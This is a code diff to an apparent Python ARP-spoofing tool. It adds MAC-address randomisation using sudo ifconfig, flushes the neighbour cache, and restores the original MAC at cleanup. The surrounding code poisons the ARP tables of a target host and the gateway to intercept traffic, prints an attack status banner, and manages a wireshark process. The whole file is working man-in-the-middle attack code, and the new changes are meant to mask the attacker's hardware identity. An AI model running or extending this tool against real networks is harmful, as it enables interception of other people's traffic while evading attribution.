@@ -10,6 +10,7 @@ import os,signal
 import sys
 import re
 import subprocess
+import random
 from subprocess import Popen, PIPE, check_output 
 
 
@@ -18,11 +19,20 @@ class Spoofing_arp:
       def __init__(self):
 
            self.arg_parse()
+           self.mac_change()
+           command = "ip -s -s neigh flush all  > output "
+           subprocess.call(command,shell=True,stderr=subprocess.PIPE)  
+           time.sleep(1)
+           command = "ping -I "+self.args.Interface + " -w1 127.0.0.1 > output  "           
+           subprocess.call(command,shell=True,stderr=subprocess.PIPE)  
+           os.remove("output") 
+           time.sleep(1)          
            self.get_geteway()
            self.Host_info()
            self.arpSpoofing()
           
       def get_geteway(self):
+          
            with open ('/proc/net/arp','r') as geteway :
                 self.router= geteway.readlines()
            for line in self.router :
@@ -32,10 +42,28 @@ class Spoofing_arp:
            self.getmac = self.rou_split[3]
            route_ipbytes = bytes(self.getaddrss.encode('utf-8'))
            self.geteway_mac = binascii.unhexlify(self.getmac.replace(":",''))
-           self.RouterIpConvert = socket.inet_aton(str(route_ipbytes).replace("'","").replace('b',""))            
+           self.RouterIpConvert = socket.inet_aton(str(route_ipbytes).replace("'","").replace('b',""))  
+
+      def mac_change(self):
+
+          command  = "ifconfig  "+ self.args.Interface + " | grep ether"
+          Current_Mac_P = subprocess.check_output (command,shell=True).decode('utf-8')
+          Current_Mac_C = re.compile(r'(?:[0-9a-fA-F]:?){12}')
+          Current_Mac_F = re.findall(Current_Mac_C , Current_Mac_P)
+          self.Current_Mac_G = str("".join(Current_Mac_F[0]))
+          with open ("./arppacket/mac_address.txt",'r') as mac_changer :
+               mac_list = mac_changer.readlines()
+          self.mac_addr = random.choice(mac_list)
+          ifconfig_down = "sudo ifconfig "+self.args.Interface+" down"
+          ifconfig_mac_change = "sudo ifconfig "+self.args.Interface+ " hw ether "+str(self.mac_addr)
+          ifconfig_up = "sudo ifconfig "+self.args.Interface+" up"
+          os.system(ifconfig_down)
+          os.system(ifconfig_mac_change)
+          os.system(ifconfig_up)
+
       def Host_info(self):
 
-           command  = "ifconfig | grep 'ether'"
+           command  = "ifconfig "+self.args.Interface+" | grep 'ether'"
            Macdb = subprocess.check_output (command,shell=True).decode('utf-8')
            Macaddr = re.compile(r'(?:[0-9a-fA-F]:?){12}')
            FMac = re.findall(Macaddr ,Macdb)
@@ -90,6 +118,10 @@ class Spoofing_arp:
               print("[*] New arp table has be created successful")
               time.sleep(1)
               print("[*] IP Forward set to  value 1")
+              print("\n[*] Mac_Change Info:\n"+'*'*22)
+              print("[*] Current Mac   -----------------|-> " + str(self.Current_Mac_G))
+              time.sleep(0.30)
+              print("[*] New Mac       -----------------|-> " + str(self.mac_addr))
               print('\n'+"*"*22)
               print("[*] Attck Status\n"+'*'*22)
               time.sleep(0.30)
@@ -107,8 +139,7 @@ class Spoofing_arp:
               time.sleep(0.30)
               print("[*] Interface     -----------------|-> " + self.args.Interface )
               print("*"*40+'\n')
-              count = 1 
-              print ("[*] Packet Send number >> ",count)
+ 
               sys.stdout.write('\x1b[1A')
               sys.stdout.write('\x1b[2K')
               count = 1
@@ -140,7 +171,7 @@ class Spoofing_arp:
                     Packet_router = eth_hdr2_Fix +arp_router
                     send_packet_to_Target   = SocketConnect.send(Packet_target)    
                     send_packet_to_router   = SocketConnect.send(Packet_router) 
-                                            
+                                          
                     print("\rHosueKeeping Cleanup Process ......")
                     print("*"*40)
                     time.sleep(0.30)
@@ -148,9 +179,18 @@ class Spoofing_arp:
                     time.sleep(1)
                     print("[*] IP Forward set to default value 0")
                     time.sleep(1)
+                    def mac_return():
+                        ifconfig_down = "sudo ifconfig "+self.args.Interface+" down"
+                        ifconfig_mac_change = "sudo ifconfig "+self.args.Interface+ " hw ether "+self.Mac_Interface
+                        ifconfig_up = "sudo ifconfig "+self.args.Interface+" up"
+                        os.system(ifconfig_down)
+                        os.system(ifconfig_mac_change)
+                        os.system(ifconfig_up)                        
+                    mac_return()
+                    time.sleep(0.30)
                     print("[*] arp Table set to Normal ...")
                     time.sleep(1)
-                   
+                    print ("[*] Real Mac Set : "+self.Current_Mac_G)
                     for ID_Number in os.popen("ps ax | grep wireshark | grep -v grep"):   
                         if "wireshark" in  ID_Number :                 
                             ProcessID = ID_Number.split()
